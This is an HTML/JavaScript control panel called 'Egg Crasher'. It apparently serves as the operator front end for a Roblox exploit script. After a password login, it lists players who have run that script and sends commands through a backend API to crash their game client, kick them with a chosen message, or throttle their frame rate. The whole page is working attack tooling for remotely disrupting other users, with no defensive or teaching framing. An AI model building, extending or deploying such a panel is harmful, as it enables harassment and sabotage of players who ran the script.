<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Egg Crasher</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #0b0d11; color: #e8edf5; padding: 20px; }

        .login-container { display: flex; justify-content: center; align-items: center; min-height: 100vh; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: #0b0d11; z-index: 9999; }
        .login-container.hidden { display: none; }
        .login-box { background: #12171f; padding: 40px; border-radius: 16px; border: 1px solid #1f2937; width: 100%; max-width: 400px; }
        .login-box h1 { text-align: center; color: #dc2626; margin-bottom: 10px; }
        .login-box .sub { text-align: center; color: #6b7a8f; margin-bottom: 30px; }
        .login-box input { width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #2a3646; background: #0b0d11; color: #e8edf5; font-size: 16px; margin-bottom: 15px; }
        .login-box input:focus { outline: none; border-color: #6366f1; }
        .login-box .btn { width: 100%; padding: 14px; border: none; border-radius: 8px; background: #dc2626; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.3s; }
        .login-box .btn:hover { background: #b91c1c; }
        .login-box .error { color: #ef4444; text-align: center; margin-top: 10px; display: none; }
        .login-box .error.show { display: block; }

        .app { display: none; }
        .app.show { display: block; }

        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: #12171f; padding: 15px 20px; border-radius: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
        .logo { font-size: 24px; font-weight: bold; color: #dc2626; }
        .stats { display: flex; gap: 20px; }
        .stats span { color: #9aabb8; }
        .stats .num { color: #fff; font-weight: bold; }
        .main { display: grid; grid-template-columns: 1fr 320px; gap: 20px; }
        @media (max-width: 768px) { .main { grid-template-columns: 1fr; } }

        .players-section { background: #12171f; border-radius: 10px; padding: 20px; }
        .player-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 10px; margin-top: 15px; }
        .player-card { background: #1a212b; padding: 12px 15px; border-radius: 8px; border: 1px solid #2a3646; cursor: pointer; transition: all 0.2s; display: flex; justify-content: space-between; align-items: center; }
        .player-card:hover { border-color: #6366f1; transform: translateY(-2px); }
        .player-card.selected { border-color: #dc2626; background: #1a1f3a; }
        .player-card .info .name { font-weight: bold; }
        .player-card .info .display { font-size: 12px; color: #6b7a8f; }
        .player-card .status { width: 10px; height: 10px; border-radius: 50%; background: #22c55e; flex-shrink: 0; }
        .player-card .status.offline { background: #4b5563; }
        .empty { text-align: center; color: #4b5a6e; padding: 40px 0; }

        .command-panel { background: #12171f; border-radius: 10px; padding: 20px; height: fit-content; }
        .command-panel h3 { margin-bottom: 5px; }
        .command-panel .sub { color: #6b7a8f; font-size: 14px; margin-bottom: 15px; }
        .btn { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: all 0.2s; }
        .btn:hover { transform: scale(1.02); }
        .btn-danger { background: #dc2626; color: #fff; }
        .btn-danger:hover { background: #b91c1c; }
        .btn-primary { background: #6366f1; color: #fff; }
        .btn-primary:hover { background: #4f46e5; }
        .btn-secondary { background: #1f2a36; color: #e8edf5; }
        .btn-secondary:hover { background: #2a3646; }
        .btn-warning { background: #f59e0b; color: #fff; }
        .btn-warning:hover { background: #d97706; }

        .fps-control { display: flex; gap: 10px; margin: 10px 0; align-items: center; }
        .fps-control input { flex: 1; padding: 8px; border-radius: 6px; border: 1px solid #2a3646; background: #0b0d11; color: #fff; width: 60px; }
        .fps-control input:focus { outline: none; border-color: #6366f1; }
        .fps-control .btn { flex: 0 0 auto; width: auto; padding: 8px 16px; margin: 0; }

        .kick-message { display: flex; gap: 10px; margin: 10px 0; align-items: center; }
        .kick-message input { flex: 1; padding: 8px; border-radius: 6px; border: 1px solid #2a3646; background: #0b0d11; color: #fff; }
        .kick-message input:focus { outline: none; border-color: #f59e0b; }
        .kick-message .btn { flex: 0 0 auto; width: auto; padding: 8px 16px; margin: 0; }

        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #1a212b; padding: 12px 24px; border-radius: 8px; border: 1px solid #2a3646; display: none; z-index: 999; }
        .toast.show { display: block; }
    </style>
</head>
<body>

<div class="login-container" id="loginContainer">
    <div class="login-box">
        <h1>🥚 Egg Crasher</h1>
        <p class="sub">Enter password to access panel</p>
        <input type="password" id="passwordInput" placeholder="Enter password..." autofocus />
        <button class="btn" onclick="login()">🔓 Login</button>
        <div class="error" id="loginError">❌ Incorrect password!</div>
    </div>
</div>

<div class="app" id="app">
    <div class="container">
        <header class="header">
            <div class="logo">🥚 Egg Crasher</div>
            <div class="stats">
                <span>🟢 <span class="num" id="onlineCount">0</span> online</span>
                <span>⏱ <span class="num" id="refreshTimer">1s</span></span>
                <span><a href="#" onclick="logout();return false;" style="color:#6b7a8f;text-decoration:none;font-size:14px;">🚪 Logout</a></span>
            </div>
        </header>

        <div class="main">
            <section class="players-section">
                <h2>👥 Players <span id="totalBadge">0</span></h2>
                <div class="player-grid" id="playerGrid">
                    <div class="empty">No players online. Execute the script in Roblox.</div>
                </div>
            </section>

            <aside class="command-panel">
                <h3>🎮 Controls</h3>
                <p class="sub" id="targetStatus">Select a player</p>

                <div class="fps-control">
                    <input type="number" id="fpsInput" placeholder="FPS" min="1" max="240" />
                    <button class="btn btn-primary" id="btnSetFps">Set</button>
                </div>
                <button class="btn btn-secondary" id="btnDisableFps">Disable FPS Limit</button>

                <div class="kick-message">
                    <input type="text" id="kickMessageInput" placeholder="Kick message..." />
                    <button class="btn btn-warning" id="btnKick">👢 KICK</button>
                </div>

                <button class="btn btn-danger" id="btnCrash">💥 CRASH</button>
            </aside>
        </div>
    </div>
</div>

<div class="toast" id="toast"></div>

<script>
    const API_BASE = window.location.origin;

    function getToken() { return localStorage.getItem('egg_token'); }
    function setToken(t) {
        if (t) localStorage.setItem('egg_token', t);
        else localStorage.removeItem('egg_token');
    }

    function esc(s) {
        const d = document.createElement('div');
        d.textContent = s == null ? '' : String(s);
        return d.innerHTML;
    }

    let refreshInterval = null;

    async function login() {
        const input = document.getElementById('passwordInput');
        const error = document.getElementById('loginError');
        error.classList.remove('show');

        try {
            const res = await fetch(API_BASE + '/api/auth/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password: input.value })
            });
            if (!res.ok) {
                error.classList.add('show');
                input.value = '';
                input.focus();
                return;
            }
            const data = await res.json();
            setToken(data.token);
            document.getElementById('loginContainer').classList.add('hidden');
            document.getElementById('app').classList.add('show');
            input.value = '';
            startApp();
        } catch (e) {
            error.textContent = '❌ Network error';
            error.classList.add('show');
        }
    }

    async function logout() {
        try {
            await fetch(API_BASE + '/api/auth/logout', {
                method: 'POST',
                headers: { 'x-session-token': getToken() || '' }
            });
        } catch {}
        setToken(null);
        if (refreshInterval) { clearInterval(refreshInterval); refreshInterval = null; }
        location.reload();
    }

    (async function boot() {
        const t = getToken();
        if (!t) return;
        try {
            const res = await fetch(API_BASE + '/api/auth/check', {
                headers: { 'x-session-token': t }
            });
            if (res.ok) {
                document.getElementById('loginContainer').classList.add('hidden');
                document.getElementById('app').classList.add('show');
                startApp();
            } else {
                setToken(null);
            }
        } catch {}
    })();

    document.getElementById('passwordInput').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') login();
    });

    let selectedUserId = null;
    let players = new Map();

    function startApp() {
        fetchPlayers();
        if (refreshInterval) clearInterval(refreshInterval);
        refreshInterval = setInterval(fetchPlayers, 3000);
    }

    async function fetchPlayers() {
        try {
            const res = await fetch(API_BASE + '/api/players', {
                headers: { 'x-session-token': getToken() || '' }
            });
            if (res.status === 401) { logout(); return; }
            const data = await res.json();
            players = new Map(data.players.map(p => [p.user_id, p]));
            renderPlayers();
        } catch (e) {
            console.error('Failed to fetch players:', e);
        }
    }

    function renderPlayers() {
        const grid = document.getElementById('playerGrid');
        const entries = Array.from(players.values());
        document.getElementById('onlineCount').textContent = entries.filter(p => p.online).length;
        document.getElementById('totalBadge').textContent = entries.length;

        if (entries.length === 0) {
            grid.innerHTML = '<div class="empty">No players online. Execute the script in Roblox.</div>';
            return;
        }

        grid.innerHTML = entries.map(p => `
            <div class="player-card ${selectedUserId === p.user_id ? 'selected' : ''}" onclick="selectPlayer('${esc(p.user_id)}')">
                <div class="info">
                    <div class="name">${esc(p.username) || 'Unknown'}</div>
                    <div class="display">${esc(p.display_name)}</div>
                </div>
                <div class="status ${p.online ? '' : 'offline'}"></div>
            </div>
        `).join('');
    }

    function selectPlayer(userId) {
        selectedUserId = userId;
        const p = players.get(userId);
        if (p) {
            document.getElementById('targetStatus').textContent = `Selected: ${p.username || 'Unknown'}`;
        }
        renderPlayers();
    }

    async function sendCommand(payload) {
        if (!selectedUserId) { showToast('Select a player first!'); return; }
        try {
            const res = await fetch(API_BASE + '/api/command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'x-session-token': getToken() || ''
                },
                body: JSON.stringify({ user_id: selectedUserId, ...payload })
            });
            if (res.status === 401) { logout(); return; }
            showToast(res.ok ? '✅ Command sent!' : '❌ Failed to send');
        } catch (e) {
            showToast('❌ Error: ' + e.message);
        }
    }

    function showToast(msg) {
        const toast = document.getElementById('toast');
        toast.textContent = msg;
        toast.classList.add('show');
        clearTimeout(toast._timeout);
        toast._timeout = setTimeout(() => toast.classList.remove('show'), 3000);
    }

    document.getElementById('btnCrash').addEventListener('click', () => {
        if (!selectedUserId) { showToast('Select a player first!'); return; }
        const p = players.get(selectedUserId);
        if (confirm(`💥 CRASH ${p?.username || 'player'}?`)) {
            sendCommand({ crash: true });
        }
    });

    document.getElementById('btnKick').addEventListener('click', () => {
        if (!selectedUserId) { showToast('Select a player first!'); return; }
        const p = players.get(selectedUserId);
        const msgInput = document.getElementById('kickMessageInput');
        const kickMessage = msgInput.value.trim() || "You have been kicked.";
        if (confirm(`👢 KICK ${p?.username || 'player'}? Message: "${kickMessage}"`)) {
            sendCommand({ kick: true, kick_message: kickMessage });
            msgInput.value = '';
        }
    });

    document.getElementById('btnSetFps').addEventListener('click', () => {
        if (!selectedUserId) { showToast('Select a player first!'); return; }
        const fpsInput = document.getElementById('fpsInput');
        const fps = parseInt(fpsInput.value);
        if (!fps || fps < 1 || fps > 240) {
            showToast('❌ Enter valid FPS (1-240)');
            return;
        }
        sendCommand({ fps_limit: fps });
        fpsInput.value = '';
    });

    document.getElementById('btnDisableFps').addEventListener('click', () => {
        if (!selectedUserId) { showToast('Select a player first!'); return; }
        sendCommand({ fps_limit: false });
    });
</script>

</body>
</html>
